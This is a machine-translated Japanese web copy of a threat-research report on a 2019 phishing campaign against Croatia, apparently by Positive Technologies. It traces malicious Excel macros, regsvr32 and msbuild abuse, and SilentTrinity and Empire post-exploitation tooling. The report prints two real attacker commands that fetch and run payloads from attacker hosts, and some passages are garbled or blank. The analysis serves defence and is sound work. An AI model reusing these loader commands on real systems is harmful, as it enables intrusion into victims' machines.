<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🥀 👲🏾 🕊️ 悪の側面にあるIronPython：ヨーロッパの国の公共サービスに対するサイバー攻撃を明らかにした方法 🚵🏾 〰️ ✊</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="セキュリティのエキスパートセンターのエキスパートが常に最新の情報を入手し、興味深く危険な脅威の出現を監視しています。このようにして、2019年4月上旬にクロアチア政府に対する標的型攻撃が発見されました。このレポートでは、被害者のコンピューターへのマルウェア配信のチェーンを調査し、侵害の兆候を示し、攻...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>悪の側面にあるIronPython：ヨーロッパの国の公共サービスに対するサイバー攻撃を明らかにした方法</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="画像"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
セキュリティのエキスパートセンターのエキスパートが常に最新の情報を入手し、興味深く危険な脅威の出現を監視しています。</font><font style="vertical-align: inherit;">このようにして、2019年4月上旬にクロアチア政府に対する標的型攻撃が発見されました。</font><font style="vertical-align: inherit;">このレポートでは、被害者のコンピューターへのマルウェア配信のチェーンを調査し、侵害の兆候を示し、攻撃者がこれまで使用したことのない新しい運用後のフレームワークの使用に言及しました。</font></font><a name="habracut"></a><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被害者感染</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2019年4月2日、新しいマルウェアのさまざまなリソースを定期的に監視しているときに、PT Expert Security Centerの専門家が異常なOfficeドキュメントを発見しました。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図1.悪意のある文書</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
MS Excelのオフィスアプリケーションで送信通知が作成され、1日前に古いXLS形式で保存されました（2019-04-01 16:28:07（UTC））。それにもかかわらず、印刷用の既存のタイムスタンプ（2018-07-25 00:12:30（UTC））は、ドキュメントが2018年に使用されたことを示しています。以下のこの間接的な症状に戻ります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
（MS Excelアプリケーションの使用を含め、変更可能な）コメントフィールドにWindowsシェル言語のコマンドが含まれていることは注目に値します。</font></font><br>
<br>
<pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in">echo</span> Set objShell = CreateObject(<span class="hljs-string">"Wscript.Shell"</span>): objShell.Run <span class="hljs-string">"net use https://postahr.vip"</span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span>, 0, False: Set objShell = Nothing  &gt; C:\users\%username%\appdata\<span class="hljs-built_in">local</span>\microsoft\silent.vbs</code></pre><br>
<img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="画像"> <br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図2.疑わしい内容の[コメント]フィールド</font></font></i><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図3.バイナリ形式の[コメント]フィールドの内容</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
このコマンドの結果として、システムは、起動時に次のアクションを実行するVisual Basic言語でスクリプトを作成します。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WebDAVテクノロジーを使用してネットワークリソースを接続する</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正規のシステムユーティリティregsvr32を使用して、感染の次の段階のファイルをダウンロードして実行します。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ネットワークリソースがHTTP（S）経由で接続されている場合、NTLMリクエストが攻撃者サーバーに送信され、NTLMハッシュを復元できます。その後、受信したハッシュは、被害者に代わってサービスの認証に使用できます。そのような攻撃の痕跡は見つかりませんでした。ネットワークリソースに接続する理由は不明のままです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
悪意のある目的でregsvr32（ActiveXコントロールを管理する）を使用する手法は新しいものではなく、名前さえ付いています-Squiblydoo。攻撃者はこれを使用して、信頼できるプログラムの起動を制御するための要件に準拠し、アンチウイルス検出をバイパスします。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それ自体、コメントフィールドのテキストは無害であり、その実行は何かによって条件付けられる必要があります。 ：被害者が受け取ったExcelドキュメントを開くと、クロアチア語トラップメッセージは説得あなたがマクロを有効にすることが表示されます</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。図4.トラップメッセージは、文書を開いた後</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
、マクロが許可されている場合、ユーザーはクロアチアの郵便ロゴとパッケージの偽の通知が表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図5.偽送信の通知</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
マクロを使用して、その間に、コメントフィールドのスクリプトが実行され、システムで作成したスクリプトは、オートロードに追加されます。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図6のキーマクロロジック</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
奇妙なことに、作成されるスクリプトはマクロによってトリガーされません。おそらくこれが攻撃者の意図です。感染の次の段階は、システムの再起動とユーザーログインの後に発生します。以下でこの詳細に戻ります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトの一部は独自の方法で興味深いものです。フォーマット、インデント、およびマークアップのその他のニュアンスを備えたきちんとしたコード構造は、サードパーティのコードを使用している兆候である可能性があり、そのようなドキュメントを自動的に作成できるプログラムでさえさえあります。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図7.借用したと思われる</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
キーワード検索</font><i><font style="vertical-align: inherit;">マクロの</font></i><font style="vertical-align: inherit;">部分は、さまざまなリソース上でコードの多くの類似部分を提供します。ハッカーは単に適切なプログラムコードを見つけて微調整し、必要なアクションを実行しただけだと考えがちです。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図8. issuu.comでの同様のマクロの例</font></font></i><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図9. stackoverflow.comの同様のマクロの</font></font></i><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例図10. dummies.comの同様のマクロの例</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
regsvr32ユーティリティを使用して、感染の次の段階に戻りましょう。コマンドが実行されると、JavaScriptのupdate.sctスクリプトレットが攻撃者のサーバーからダウンロードされます。スクリプトの本体には、Base64アルゴリズムでエンコードされたバイナリデータが含まれています。デコード後、受信したデータは.NET Frameworkソフトウェアプラットフォームを使用して逆シリアル化および実行されます。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図11.攻撃者のサーバーからダウンロードされたupdate.sctスクリプト</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
このコードは、攻撃者がパブリックリソースの1つで借用したことにも注意する必要があります。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図12. rastamouse.me </font></font></i><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">での類似のコードの例図13. </font></i><i><font style="vertical-align: inherit;">github.com </font></i></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">での類似のコードの例</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ハッカーが使用するツールのロジックを注意深く掘り下げたようには見えません。たとえば、検討中のスクリプトレットでは、何もしないsetversion関数が呼び出されます。 Webで利用可能な1つの例も表示されます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
解凍されて起動されたオブジェクトは、.NETプラットフォーム上の実行可能なPEファイルです。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図14.実行可能PEファイルのヘッダー</font></font></i><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図15. SharpPick PEファイルのデバッグ情報</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
コンパイルの結果、ソースコードを含むプロジェクトへのパスが保存されました。 -masterサフィックスは、プロジェクトが以前にリポジトリから複製されたことを示し、SharpPickディレクトリは、言語インタープリターを直接使用せずに.NETの依存関係を使用せずにPowerShellコードをロードして実行できる有名なアプリケーションにつながります。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
GitHubでSharpPickユーティリティプロジェクトを利用できるにもかかわらず、重要な変更が行われていないことを確認する必要があります。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SharpPickユーティリティの逆コンパイルコードの図16パート</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
逆コンパイルの結果は、擬似コードが、その間、それはBase64でから復号され、PowerShellのスクリプトが起動され、得られた：</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図17を部分的にPowerShellスクリプトを変換</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
コードを簡略化した後、そのロジックを解析することは困難ではありません。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オブジェクトは、指定されたUser-Agent、Cookie、およびプロキシ設定でWebサーバーと対話するために形成されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ペイロードは指定されたアドレスにロードされます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結果は、指定されたキーを使用してRC4アルゴリズムによって復号化され、開始されます。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
残念ながら、調査中、管理サーバーはすでに利用できませんでした。以前に彼から受け取ったデータは見つかりませんでした。ただし、今回はウェブ上に十分な情報があります（例：</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FireEye</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">からの同僚のレポート</font><font style="vertical-align: inherit;">）。この感染チェーンの最終リンクは、Empireバックドアであり、Empire Frameworkの操作後フレームワークの一部として被害者のコンピューターをリモート管理するためのツールです。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図18.同様のPowerShellスクリプトを使用してWinRARの脆弱性を攻撃する</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
興味深いことに、他のスクリプトパターンは、侵入テスト技術に関する広範な記事につながり、プロキシサーバーの背後にある攻撃者のインフラストラクチャを隠すことに特に注意を払っています。攻撃者が使用する可能性が最も高い情報源は、Payatu Technologiesの同僚による記事</font><font style="vertical-align: inherit;">で、Empireの使用を含め、セッションを正当なリソースにリダイレクトする、不要なパケットをブロックする、ログを記録</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">するなどの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">詳細な手順</font><font style="vertical-align: inherit;">を</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;">提供し</font></a><font style="vertical-align: inherit;">てい</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
数時間後、小包に別の文書が見つかりました。それは前のものと多くの類似点があります：クロアチアでも見られ（2019-04-02 16:52:56（UTC））、同じ名前で、受け取った小包に関するトラップ画像さえあります。しかし、まだ違いがあります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
悪意のあるコードは再び[コメント]フィールドに配置されますが、今回はアクションのロジックが変更されています。</font></font><br>
<br>
<pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in">echo</span> Set objShell = CreateObject(<span class="hljs-string">"Wscript.Shell"</span>):objShell.Run <span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span> , 0, False: Set objShell = Nothing  &gt; C:\users\%username%\appdata\<span class="hljs-built_in">local</span>\microsoft\silent.vbs</code></pre><br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ネットワークリソースは、SMBプロトコルを使用して接続されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.NET Frameworkパッケージの正規のユーティリティであるmsbuildを使用して、感染の次の段階をダウンロードして起動します。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
マウントされたディレクトリのアドレスに文字列webdavが含まれていることは奇妙です。</font><font style="vertical-align: inherit;">今回は、NTLMハッシュへの攻撃は依然として可能ですが、その使用の証拠はありません。</font><font style="vertical-align: inherit;">ここでも、正規のアプリケーション（今回はmsbuild）を使用して、サードパーティプログラムの起動に関する制限を回避しています。</font><font style="vertical-align: inherit;">悪用の手法を説明する前に、新しいドキュメントのマクロのプログラムコードの違いについて説明します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
攻撃者はVBAスクリプトのロジックに大きな変更を加えていません。ただし、今回は、作成されたVBSスクリプトをシステムに自動的にロードするだけでなく、ドキュメントを開いたときに実行することにも注意してください。おそらく、前のケースでは、攻撃者は単にそれを忘れており、しばらくして間違いを発見した後、ドキュメントの新しいバージョンで修正しました。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図19. 2つのドキュメント</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
の</font><i><font style="vertical-align: inherit;">マクロコードの比較</font></i><font style="vertical-align: inherit;">感染の次の段階は、C＃コードを含むXMLドキュメントです。 msbuildユーティリティの機能により、含まれているコードをオンザフライでコンパイルして実行できます。これは、ハッカーがマークアップの先頭に残したコメントによって証明されています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Base64バッファーが再びコードに表示され、デコードされ、Deflateアルゴリズムによって解凍されて起動されます。前述のコメントと同じコードを使用したWeb上の多くのソースから明らかなように、読者は今回、攻撃者も自由にアクセスできるテンプレートを使用したことをすでに理解していると思います。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図20.攻撃者のサーバーからダウンロードされたmsbuild.xmlタスク</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
結果として、今度は.NETプラットフォーム上のPEファイルがメモリに読み込まれて実行されます。また、デバッグ情報には、プロジェクトが仮想マシンで収集されたという兆候（おそらく攻撃者に関する情報を隠すため）だけでなく、SILENTTRINITYディレクトリも含まれています。これについては、後で詳しく説明します。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図21. SILENTTRINITY PEファイルのデバッグ情報</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これら2つの小包ドキュメントを調べたところ、さらに2つ見つかりました。ファイル形式、名前、および指定された領域のピクチャートラップは変更されていません。文書は2018年8月末に入手可能となりました。これは、レポートの冒頭で述べた長期キャンペーンの仮説を裏付けるものです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
昨年のハッカーが「コメント」フィールドを使用しなかったのは奇妙ですが、彼らは合法的なユーティリティを起動しました。悪意のあるコンポーネントはcertutil証明書と暗号化ユーティリティを使用して読み込まれ、WMIシステム管理ツールによって起動されました。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図22. 2018年のドキュメントマクロの比較</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
残念ながら、事件後の2018年に攻撃チェーンに後続のリンクを確立できませんでした。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
作業のロジックを説明する削除された補助コメントを除いて、VBAスクリプトコードの一部が変更されていないことにも注意する必要があります。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図23. 2019マクロと2018マクロの比較</font></font></i><br>
 <br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SilentTrinityフレームワーク </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PEファイルのデバッグ情報からのSILENTTRINITYキーワードの検索結果により、この攻撃リンクの発信元を簡単に特定できます。 2018年10月、Marcello Salvati（Black Hills Information Securityの研究者）は、人気のあるGitHubリポジトリにSILENTTRINITYというプロジェクトを投稿しました。主なアイデア：Pythonスクリプトプログラミング言語、つまりIronPythonで、よく知られている操作後のPowerShellフレームワークの柔軟性と利点を使用する。プロジェクトは今日まで発展しています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
作業とプロジェクトの実装の詳細については詳しく説明しません（特に、著者が彼の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">レポート</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">で詳細について述べたためです</font><font style="vertical-align: inherit;">）。作業の基本的なロジックと実装の興味深い点のみを強調します。</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PEファイルを開始した後（ただし、中間リンクは別の形式である可能性があります）、以下が発生します。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理サーバーに接続して、必要な依存関係とメインのPythonスクリプトを含むZIPアーカイブをダウンロードします。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アーカイブの内容はディスクに保存せずに抽出されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pythonスクリプトの処理を成功させるために依存関係が登録されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">メインのPythonスクリプトが起動され、攻撃者からのタスクを待機します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各タスクは既製のPythonスクリプトとして転送されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">タスクは別のスレッドで被害者側で実行されます。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作業の結果は、配布管理システムに転送されます。</font></font></li>
</ul><br>
<img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="画像"> <br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図24. SilentTrinityフレームワークの操作図</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
機能の中で、以下を強調する価値があります。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Boo言語（強く型付けされたデータを持つIronPythonのサブセット）を含むIronPythonのサポート。</font></font></li>
<li>     : , ,     (fileless-).</li>
<li>  , ,    —         AES.</li>
<li>     — .</li>
<li>      HTTP(S)   .</li>
</ul><br>
<img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図25. SilentTrinityフレームワークのサーバー側のユーザーインターフェイスの例</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
興味深いことに、攻撃の当日、PEローダーがVirusTotalサービスにアップロードされ、ウイルス対策ベンダーが悪意のあるものとして識別していませんでした。これは驚くべきことではありません。最初に、バイナリファイルがディスクに届かず、署名の検出があまり意味がありません。第二に、静的検出はユーザーを保護するための唯一の技術ではありません。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図26.攻撃の日にSilentTrinityブートローダーをスキャンした結果</font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
さらに、攻撃の数日後、検出の判定が表示され始めました。攻撃の期間中、保護装置に検出アルゴリズムがまだ装備されていないか、または脅威が原理的に知られていないことが重要です。</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図27. SilentTrinityブートローダーをスキャンした実際の結果</font></font></i><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
最も可能性が高いのは、攻撃を行うためにこのソリューションを選択した理由です。 SilentTrinityフレームワークが悪意のある攻撃で既に使用されているという情報はありません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
攻撃者</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
が使用するインフラストラクチャハッカーが使用するネットワークインフラストラクチャは、時系列的に進行中の攻撃に関連していることに言及する価値があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表1.攻撃サーバーとして使用されるドメインに関する情報。</font></font><br>
</i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ドメインは、正当な攻撃リソースのように見えるように作成されました。これにより、フィッシング攻撃に対するユーザーの信頼を得ることができます。関連するリソースはクロアチアに限定されないことに注意してください。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
すべてのドメインは、WhoisGuardセキュリティ技術を使用して登録されています。</font><font style="vertical-align: inherit;">攻撃者がこのテクノロジーを匿名化の目的で使用する一方で、スパムから保護するために実際のドメイン登録者情報を非表示にすることができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
マルウェアを配布および管理するサーバーは、オランダのプロバイダーであるBreezleからリースされました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
相互に多くの接続がある攻撃者のノード、アドレス、およびドメインに関するすべての利用可能な情報により、攻撃者が今回行った大量のマルウェアについて判断することができます。</font><font style="vertical-align: inherit;">キャンペーンで検討されているものと同様のツールを使用でき、感染のいくつかのケースが未解決のままであることを除外しません。</font></font><br>
 <br>
<img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="画像"><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">図28.攻撃者のインフラストラクチャの図解</font></font></i><br>
 <br>
